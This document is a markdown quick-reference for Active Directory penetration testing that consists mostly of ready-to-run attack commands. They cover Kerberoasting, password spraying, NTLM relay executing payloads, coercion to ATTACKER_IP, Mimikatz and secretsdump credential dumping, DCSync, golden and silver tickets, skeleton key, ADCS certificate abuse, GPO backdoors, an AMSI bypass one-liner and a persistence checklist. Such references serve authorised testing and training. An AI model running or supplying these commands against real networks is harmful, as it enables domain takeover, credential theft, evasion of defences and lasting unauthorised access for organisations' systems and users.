# Active Directory Pentesting — Complete Quick Reference

**References:**

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://www.thehacker.recipes/ad
- https://wadcoms.github.io
- https://hideandsec.sh/books/cheatsheets-82c/page/active-directory
- https://orange-cyberdefense.github.io/ocd-mindmaps/
## Initial Enumeration & Recon

### BloodHound / SharpHound

```powershell
# SharpHound — collect everything (noisy)
SharpHound.exe --CollectionMethods All --ZipFileName loot.zip
SharpHound.exe -c All -d corp.local -u user@corp.local -p 'Password1!'
# Stealth — LDAP only, single-threaded
SharpHound.exe --CollectionMethods DCOnly --Stealth
# Loop session collection (run for hours to catch logons)
SharpHound.exe -c Session --Loop --LoopDuration 04:00:00
# PowerShell variant
powershell -ep bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName loot.zip
```

From Kali (no need to be on the box):

```bash
pip3 install bloodhound
bloodhound-python -u 'user' -p 'Password1!' -ns DC_IP -d corp.local -c All
# RustHound alternative (fast, cross-platform)
rusthound-ce -d corp.local -u user -p 'Password1!' -c All -z
```

BloodHound GUI:

```bash
neo4j console
bloodhound
# Upload zip → Analysis tab → pre-built queries
# Key queries: "Shortest Path to Domain Admin", "Kerberoastable Users", "Find AS-REP Roastable Users"
```

### PowerView

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
# Domain info
Get-NetDomain
Get-NetDomainController
Get-DomainSID
# Users
Get-DomainUser | select samaccountname,description,memberof
Get-DomainUser -SPN                          # kerberoastable
Get-DomainUser -PreauthNotRequired           # AS-REP roastable
Get-DomainUser -AdminCount                   # high-value targets
# Groups
Get-DomainGroup -Identity "Domain Admins" | select member
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# Computers
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainComputer -Unconstrained            # unconstrained delegation
# Shares
Find-DomainShare -CheckShareAccess
# GPOs
Get-DomainGPO | select displayname,gpcfilesyspath
# ACLs
Find-InterestingDomainAcl -ResolveGUIDs
# Trust
Get-DomainTrust
Get-ForestTrust
# Sessions (who's logged in where)
Get-NetSession -ComputerName dc01
Find-DomainUserLocation                      # hunt for DA sessions
```

### ldapdomaindump (from Kali)

```bash
ldapdomaindump -u 'corp.local\user' -p 'Password1!' DC_IP -o ldap_dump/
# Produces HTML/JSON/grep files for users, groups, computers, trusts, policies
```

### windapsearch

```bash
windapsearch -d corp.local --dc DC_IP -u user@corp.local -p 'Password1!' --da     # domain admins
windapsearch -d corp.local --dc DC_IP -u user@corp.local -p 'Password1!' --users  # all users
windapsearch -d corp.local --dc DC_IP -u user@corp.local -p 'Password1!' -m computers
```

### ADRecon

```powershell
.\ADRecon.ps1 -DomainController DC_IP -Creds
# Generates Excel report with users, groups, GPOs, trusts, LAPS, etc.
```

### Enum4linux-ng (from Kali)

```bash
enum4linux-ng -A -u 'user' -p 'Password1!' DC_IP
```

### rpcclient

```bash
rpcclient -U 'user%Password1!' DC_IP
> enumdomusers
> enumdomgroups
> queryuser 0x1f4                            # RID 500 = Administrator
> querydispinfo
> getdompwinfo                               # password policy
```

### CrackMapExec / NetExec (Swiss Army Knife)

```bash
# Enumerate
crackmapexec smb DC_IP -u user -p 'Password1!' --users
crackmapexec smb DC_IP -u user -p 'Password1!' --groups
crackmapexec smb DC_IP -u user -p 'Password1!' --shares
crackmapexec smb DC_IP -u user -p 'Password1!' --sessions
crackmapexec smb DC_IP -u user -p 'Password1!' --pass-pol
crackmapexec smb SUBNET/24 -u user -p 'Password1!' --gen-relay-list relay.txt
```

### Nmap AD Scripts

```bash
nmap --script "ldap* and not brute" -p 389 DC_IP
nmap --script ms-sql-info,ms-sql-config -p 1433 DC_IP
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.local',userdb=users.txt DC_IP
```

## Credential Attacks

### Kerberoasting

Any domain user can request TGS tickets for SPNs and crack them offline.

```bash
# From Kali (impacket)
impacket-GetUserSPNs -request -dc-ip DC_IP corp.local/user:'Password1!' -outputfile kerberoast.txt
# From Windows (Rubeus)
Rubeus.exe kerberoast /outfile:kerberoast.txt
# From Windows (PowerView + Invoke-Kerberoast)
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash > kerberoast.txt
# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### AS-REP Roasting

Targets users with "Do not require Kerberos preauthentication" set.

```bash
# From Kali
impacket-GetNPUsers -dc-ip DC_IP corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-GetNPUsers -dc-ip DC_IP corp.local/user:'Password1!' -request
# From Windows
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying

```bash
# CrackMapExec (careful of lockout!)
crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --no-bruteforce
crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --continue-on-success
# Kerbrute (doesn't generate logon events if pre-auth fails)
kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Spring2024!'
kerbrute userenum -d corp.local --dc DC_IP users.txt  # enumerate valid users first
# DomainPasswordSpray (from Windows)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2024!' -Domain corp.local
```

> Always check password policy first: `crackmapexec smb DC_IP -u user -p pass --pass-pol` or `net accounts /domain`

### Responder / LLMNR/NBT-NS Poisoning

```bash
# Capture hashes on the wire
sudo responder -I eth0 -dwPv
# Relay instead of capture (disable SMB/HTTP in Responder first)
sudo responder -I eth0 -dwPv
ntlmrelayx.py -tf targets.txt -smb2support -i  # interactive shell
ntlmrelayx.py -tf targets.txt -smb2support -e rev.exe  # execute payload
ntlmrelayx.py -tf targets.txt -smb2support --delegate-access  # RBCD attack
```
### Coercion Attacks (Force Auth)

```bash
# PetitPotam (unauthenticated if unpatched)
python3 PetitPotam.py ATTACKER_IP DC_IP
# PrinterBug / SpoolSample
python3 printerbug.py corp.local/user:'Password1!'@DC_IP ATTACKER_IP
SpoolSample.exe DC_IP ATTACKER_IP
# Coercer (tries multiple methods)
coercer coerce -l ATTACKER_IP -t DC_IP -u user -p 'Password1!' -d corp.local
# DFSCoerce
python3 dfscoerce.py -u user -p 'Password1!' -d corp.local ATTACKER_IP DC_IP
```
## Combine with ntlmrelayx or responder to capture/relay the forced auth.

## Credential Dumping

### Mimikatz

```powershell
# Run as admin/SYSTEM
privilege::debug
# Dump logon passwords (cleartext if wdigest enabled, NTLM hashes)
sekurlsa::logonpasswords
# Dump SAM
lsadump::sam
# DCSync (need DA or Replicating Directory Changes)
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv
# Dump cached creds
lsadump::cache
# Golden ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
# Silver ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:srv01.corp.local /service:cifs /rc4:HASH /ptt
# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH
# Pass-the-ticket
kerberos::ptt ticket.kirbi
# Export tickets
sekurlsa::tickets /export
# Dump DPAPI
vault::cred
dpapi::masterkey /in:masterkey_file /rpc
```

### Impacket secretsdump

```bash
# Remote — DCSync
impacket-secretsdump corp.local/Administrator:'Password1!'@DC_IP
impacket-secretsdump corp.local/Administrator@DC_IP -hashes :NTHASH
# From NTDS.dit + SYSTEM (offline)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# Just DC (DCSync specific user)
impacket-secretsdump -just-dc-user Administrator corp.local/user:'Password1!'@DC_IP
```

### Other Dumping Tools

```bash
# CrackMapExec
crackmapexec smb TARGET -u Administrator -p 'Password1!' --sam
crackmapexec smb TARGET -u Administrator -p 'Password1!' --lsa
crackmapexec smb TARGET -u Administrator -p 'Password1!' --ntds
crackmapexec smb TARGET -u Administrator -H NTHASH --ntds
# From Windows
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SECURITY security.bak
# Then exfil and:
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
```

### Rubeus (Kerberos Ticket Manipulation)

```powershell
# Dump all tickets
Rubeus.exe dump
Rubeus.exe triage
# Request TGT
Rubeus.exe asktgt /user:Administrator /rc4:HASH /ptt
Rubeus.exe asktgt /user:Administrator /aes256:HASH /ptt
# S4U (constrained delegation abuse)
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt
# Monitor for new TGTs (runs in loop)
Rubeus.exe monitor /interval:5
```

### LaZagne (All-in-One Credential Harvester)

```bash
# Dump everything: browsers, wifi, mail, databases, sysadmin tools, etc.
lazagne.exe all
```

### SessionGopher

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
# Extracts saved sessions from PuTTY, WinSCP, FileZilla, RDP, etc.
```

---

## Lateral Movement

### PsExec / WMIExec / SMBExec / ATExec

```bash
# Impacket suite
impacket-psexec corp.local/Administrator:'Password1!'@TARGET
impacket-psexec corp.local/Administrator@TARGET -hashes :NTHASH
impacket-wmiexec corp.local/Administrator:'Password1!'@TARGET
impacket-smbexec corp.local/Administrator:'Password1!'@TARGET
impacket-atexec corp.local/Administrator:'Password1!'@TARGET 'whoami'
# Sysinternals PsExec
PsExec.exe \\TARGET -u corp\Administrator -p Password1! cmd.exe
```

### Evil-WinRM

```bash
evil-winrm -i TARGET -u Administrator -p 'Password1!'
evil-winrm -i TARGET -u Administrator -H NTHASH
evil-winrm -i TARGET -u Administrator -k  # kerberos
# Upload/download
upload /path/to/winPEASx64.exe
download C:\Users\admin\flag.txt
```

### CrackMapExec Execution

```bash
crackmapexec smb TARGET -u Administrator -p 'Password1!' -x 'whoami'       # cmd
crackmapexec smb TARGET -u Administrator -p 'Password1!' -X 'whoami'       # powershell
crackmapexec winrm TARGET -u Administrator -p 'Password1!' -x 'whoami'
crackmapexec smb SUBNET/24 -u Administrator -H NTHASH -x 'whoami'          # spray + exec
```

### WinRS

```cmd
winrs -r:TARGET -u:Administrator -p:Password1! cmd.exe
```

### DCOM Execution

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd","/c whoami > C:\output.txt","","7")
```

### RDP

```bash
xfreerdp /v:TARGET /u:Administrator /p:'Password1!' /cert-ignore +clipboard /drive:share,/tmp
xfreerdp /v:TARGET /u:Administrator /pth:NTHASH /cert-ignore    # pass-the-hash RDP
```

### PowerUpSQL (MSSQL Lateral Movement)

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                        # find SQL servers via SPNs
Get-SQLServerInfo -Instance "srv01,1433"
Invoke-SQLOSCmd -Instance "srv01,1433" -Command "whoami" -Verbose
# Crawl linked servers
Get-SQLServerLinkCrawl -Instance "srv01,1433" -Verbose
```

---

## Privilege Escalation (AD-Specific)

### DCSync

Requires: `Replicating Directory Changes` + `Replicating Directory Changes All` permissions.

```bash
# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
# Impacket
impacket-secretsdump -just-dc corp.local/user:'Password1!'@DC_IP
# CrackMapExec
crackmapexec smb DC_IP -u user -p 'Password1!' --ntds
```

### Unconstrained Delegation

Computer trusts for delegation to any service. If you compromise it, you get TGTs of anyone who authenticates.

```powershell
# Find unconstrained delegation machines
Get-DomainComputer -Unconstrained | select dnshostname
# Monitor for incoming TGTs (on compromised unconstrained host)
Rubeus.exe monitor /interval:5 /nowrap
# Force DC to auth (SpoolSample/PetitPotam) → capture TGT → ptt
Rubeus.exe ptt /ticket:BASE64_TICKET
```

### Constrained Delegation

```powershell
# Find constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto
# Abuse with Rubeus (S4U)
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /altservice:ldap /ptt
```

```bash
# From Kali (impacket)
impacket-getST -spn cifs/target.corp.local -impersonate Administrator corp.local/svc_sql -hashes :HASH
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target.corp.local
```

### Resource-Based Constrained Delegation (RBCD)

Need: write access to target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
# Create machine account (if MachineAccountQuota > 0)
impacket-addcomputer corp.local/user:'Password1!' -computer-name 'FAKE$' -computer-pass 'FakePass1!'
# Set RBCD
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write corp.local/user:'Password1!'
# Get ticket
impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/'FAKE$':'FakePass1!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
```

### ACL Abuse

```powershell
# GenericAll on user → reset password
net user targetuser NewPass123! /domain
# GenericAll on group → add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members compromiseduser
# GenericWrite → set SPN for kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
# Then kerberoast that user
# WriteDACL → grant yourself DCSync
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity compromiseduser -Rights DCSync
# WriteOwner → take ownership → modify DACL
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity compromiseduser
```

### GPO Abuse

```powershell
# SharpGPOAbuse — add local admin via GPO you control
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount compromiseduser --GPOName "Vuln GPO"
SharpGPOAbuse.exe --AddComputerTask --TaskName "backdoor" --Author corp\admin --Command "cmd.exe" --Arguments "/c net localgroup Administrators compromiseduser /add" --GPOName "Vuln GPO"
# Force GPO update
gpupdate /force
```

---

## ADCS (Certificate Services) Attacks

### Enumeration

```bash
# Certipy (from Kali) — find all vulns
certipy find -u user@corp.local -p 'Password1!' -dc-ip DC_IP
certipy find -u user@corp.local -p 'Password1!' -dc-ip DC_IP -vulnerable -stdout
# Certify (from Windows)
Certify.exe find /vulnerable
Certify.exe cas                              # enumerate CAs
```

### ESC1 — Enrollee Supplies Subject + Client Auth EKU

Domain Users can enroll, template allows you to specify SAN → impersonate anyone.

```bash
certipy req -u user@corp.local -p 'Password1!' -dc-ip DC_IP -target CA_HOST -ca 'CA-NAME' -template 'VulnTemplate' -upn 'administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# Returns NT hash → use for pass-the-hash
```

### ESC4 — Template Write Access

You can write to a template → make it vulnerable to ESC1 → exploit → restore.

```bash
certipy template -u user@corp.local -p 'Password1!' -template ESC4 -save-old -dc-ip DC_IP
certipy template -u user@corp.local -p 'Password1!' -template ESC4 -write-default-configuration -dc-ip DC_IP
# Now exploit as ESC1
certipy req -u user@corp.local -p 'Password1!' -dc-ip DC_IP -target CA_HOST -ca 'CA-NAME' -template ESC4 -upn administrator@corp.local
# Restore
certipy template -u user@corp.local -p 'Password1!' -template ESC4 -configuration ESC4.json
```

### ESC7 — ManageCA ACL

```bash
# Add yourself as officer
certipy ca -u user@corp.local -p 'Password1!' -ca 'CA-NAME' -add-officer user -dc-ip DC_IP
# Enable vulnerable template
certipy ca -u user@corp.local -p 'Password1!' -ca 'CA-NAME' -enable-template 'SubCA'
# Request (will fail) → issue manually → retrieve
certipy req -u user@corp.local -p 'Password1!' -ca 'CA-NAME' -template SubCA -upn administrator@corp.local -dc-ip DC_IP
certipy ca -u user@corp.local -p 'Password1!' -ca 'CA-NAME' -issue-request REQUEST_ID -dc-ip DC_IP
certipy req -u user@corp.local -p 'Password1!' -ca 'CA-NAME' -retrieve REQUEST_ID -dc-ip DC_IP
```

### ESC8 — Web Enrollment Relay

```bash
# Start relay pointing at CA web enrollment
certipy relay -ca CA_IP -template DomainController
# Coerce DC to authenticate (PetitPotam)
python3 PetitPotam.py ATTACKER_IP DC_IP
# Get certificate → auth → DCSync
certipy auth -pfx dc.pfx -dc-ip DC_IP
impacket-secretsdump -hashes :HASH corp.local/DC$@DC_IP
```

### Auth with Certificate

```bash
certipy auth -pfx cert.pfx -dc-ip DC_IP
# If PKINIT fails (KDC_ERR_PADATA_TYPE_NOSUPP) → use Schannel
certipy auth -pfx cert.pfx -dc-ip DC_IP -ldap-shell
```

---

## Domain Persistence

### Golden Ticket

Need: `krbtgt` NTLM hash + domain SID.

```powershell
# Mimikatz
kerberos::golden /user:fakeuser /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
# Impacket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local fakeuser
export KRB5CCNAME=fakeuser.ccache
impacket-psexec -k -no-pass corp.local/fakeuser@DC_IP
```

### Silver Ticket

Forge ticket for a specific service. Need: service account NTLM hash.

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:srv01.corp.local /service:cifs /rc4:SVC_HASH /ptt
```

### Skeleton Key

Patches LSASS on DC. Any user can auth with password "mimikatz" while real passwords still work.

```powershell
privilege::debug
misc::skeleton
# Now: any account + password "mimikatz" = valid auth
```

### DSRM (Directory Services Restore Mode)

```powershell
# Change DSRM password
ntdsutil "set dsrm password" "reset password on server null" q q
# Enable network logon for DSRM account
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
# Login as DSRM admin
sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:DSRM_HASH
```

### AdminSDHolder Persistence

```powershell
# Add yourself to AdminSDHolder ACL — propagates to all protected groups every 60 min
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity compromiseduser -Rights All
```

### Certificate Persistence

```bash
# Request long-lived cert → survives password changes
certipy req -u administrator@corp.local -p 'Password1!' -ca 'CA-NAME' -template User -dc-ip DC_IP
# Auth anytime
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## LAPS (Local Administrator Password Solution)

```powershell
# Check if LAPS is deployed
Get-DomainComputer | select dnshostname,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
# PowerView
Get-DomainComputer -Identity target -Properties ms-mcs-admpwd
# LAPSToolkit
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
Find-LAPSDelegatedGroups
```

```bash
# From Kali
crackmapexec ldap DC_IP -u user -p 'Password1!' -M laps
```

---

## Domain Trust Attacks

```powershell
# Enumerate trusts
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts
# Cross-trust Golden Ticket (need trust key)
kerberos::golden /user:Administrator /domain:child.corp.local /sid:CHILD_SID /sids:S-1-5-21-PARENT_SID-519 /krbtgt:CHILD_KRBTGT_HASH /ptt
```

```bash
# Impacket
impacket-raiseChild corp.local/Administrator:'Password1!' -target-exec DC_IP
```

---

## AMSI & AV Bypass

```powershell
# One-liner AMSI bypass (changes frequently, google for latest)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Obfuscation
Invoke-Obfuscation                           # PowerShell obfuscator
Invoke-CradleCrafter                         # download cradle obfuscation
# AMSITrigger — find exact strings that trigger AMSI
AMSITrigger.exe -i script.ps1 -f 3
```

### AppLocker Bypass

```powershell
# Check policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# Common bypass paths
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\Tracing\
```

---

## Useful Impacket One-Liners

```bash
impacket-GetUserSPNs corp.local/user:'Pass' -dc-ip DC_IP -request    # kerberoast
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP    # AS-REP
impacket-secretsdump corp.local/admin:'Pass'@DC_IP                    # DCSync
impacket-psexec corp.local/admin:'Pass'@TARGET                       # remote shell
impacket-wmiexec corp.local/admin:'Pass'@TARGET                      # stealthier shell
impacket-smbexec corp.local/admin:'Pass'@TARGET                      # SMB shell
impacket-getTGT corp.local/user:'Pass'                                # request TGT
impacket-getST -spn cifs/TARGET -impersonate Admin corp.local/svc    # constrained deleg
impacket-addcomputer corp.local/user:'Pass' -computer-name 'FAKE$'   # add machine acct
impacket-rbcd corp.local/user:'Pass' -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write
impacket-ntlmrelayx -tf targets.txt -smb2support                     # NTLM relay
impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local admin  # golden ticket
impacket-lookupsid corp.local/user:'Pass'@DC_IP                      # RID brute
impacket-reg corp.local/admin:'Pass'@TARGET query -keyName HKLM\\SAM  # remote reg
impacket-dpapi ...                                                    # DPAPI secrets
```

---

## Windows PrivEsc Tools (Local)

```powershell
# Automated enumeration
.\winPEASx64.exe
.\PowerUp.ps1; Invoke-AllChecks
.\PrivescCheck.ps1; Invoke-PrivescCheck
.\SharpUp.exe audit
.\Seatbelt.exe -group=all
# Kernel exploits
.\Watson.exe                                 # suggest kernel CVEs
.\windows-exploit-suggester.py --systeminfo sysinfo.txt
# JAWS
.\jaws-enum.ps1
```

---

## Password Cracking Reference

```bash
# Kerberoast (TGS-REP)
hashcat -m 13100 hashes.txt wordlist.txt
# AS-REP
hashcat -m 18200 hashes.txt wordlist.txt
# NTLM
hashcat -m 1000 hashes.txt wordlist.txt
# NTLMv2 (responder captures)
hashcat -m 5600 hashes.txt wordlist.txt
# NetNTLMv1
hashcat -m 5500 hashes.txt wordlist.txt
# DCC2 (cached domain creds)
hashcat -m 2100 hashes.txt wordlist.txt
# MsCache2
hashcat -m 2100 hashes.txt wordlist.txt
# DPAPI masterkey
hashcat -m 15900 hashes.txt wordlist.txt
```

---

## Network Recon & Scanning

```bash
# Fast host discovery
nmap -sn SUBNET/24
masscan SUBNET/24 -p 445,88,389,3389 --rate=1000
# Common AD ports
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986,9389 TARGET
# SMB
crackmapexec smb SUBNET/24
smbclient -L //TARGET/ -U 'user%Password1!'
smbmap -H TARGET -u user -p 'Password1!'
```

---

## Post-Exploitation Checklist

1. `whoami /all` — check privs and group memberships
2. Run BloodHound/SharpHound — map attack paths
3. Check for LAPS passwords you can read
4. Dump creds (SAM, LSA, LSASS, cached creds)
5. Check for saved credentials (`cmdkey /list`, `vault::cred`)
6. Look for ADCS misconfigurations (`certipy find -vulnerable`)
7. Check delegation settings (unconstrained, constrained, RBCD)
8. Enumerate ACLs for writeable objects
9. Check GPOs you can modify
10. Look for domain trusts to pivot
11. Spray captured hashes across the network
12. Establish persistence (golden ticket, certs, AdminSDHolder, planted keys)

---

## Tool Sources

|Tool|URL|
|---|---|
|BloodHound CE|https://github.com/SpecterOps/BloodHound|
|SharpHound|https://github.com/BloodHoundAD/SharpHound|
|bloodhound-python|`pip3 install bloodhound`|
|RustHound-CE|https://github.com/NH-RED-TEAM/RustHound-CE|
|PowerView|https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1|
|Rubeus|https://github.com/GhostPack/Rubeus|
|Mimikatz|https://github.com/gentilkiwi/mimikatz|
|Impacket|https://github.com/fortra/impacket|
|CrackMapExec|https://github.com/Pennyw0rth/NetExec|
|Certipy|https://github.com/ly4k/Certipy|
|Certify|https://github.com/GhostPack/Certify|
|Evil-WinRM|https://github.com/Hackplayers/evil-winrm|
|Responder|https://github.com/lgandx/Responder|
|Kerbrute|https://github.com/ropnop/kerbrute|
|PetitPotam|https://github.com/topotam/PetitPotam|
|Coercer|https://github.com/p0dalirius/Coercer|
|PowerUp|https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1|
|winPEAS|https://github.com/carlospolop/PEASS-ng|
|Seatbelt|https://github.com/GhostPack/Seatbelt|
|SharpUp|https://github.com/GhostPack/SharpUp|
|PrivescCheck|https://github.com/itm4n/PrivescCheck|
|ADRecon|https://github.com/adrecon/ADRecon|
|Group3r|https://github.com/Group3r/Group3r|
|SharpGPOAbuse|https://github.com/FSecureLABS/SharpGPOAbuse|
|LAPSToolkit|https://github.com/leoloobeek/LAPSToolkit|
|LaZagne|https://github.com/AlessandroZ/LaZagne|
|SessionGopher|https://github.com/Arvanaghi/SessionGopher|
|PowerUpSQL|https://github.com/NetSPI/PowerUpSQL|
|Inveigh|https://github.com/Kevin-Robertson/Inveigh|
|DomainPasswordSpray|https://github.com/dafthack/DomainPasswordSpray|
|Invoke-Obfuscation|https://github.com/danielbohannon/Invoke-Obfuscation|
|AMSITrigger|https://github.com/RythmStick/AMSITrigger|
|PingCastle|https://github.com/vletoux/pingcastle|
|enum4linux-ng|https://github.com/cddmp/enum4linux-ng|
|ldapdomaindump|https://github.com/dirkjanm/ldapdomaindump|
|windapsearch|https://github.com/ropnop/windapsearch|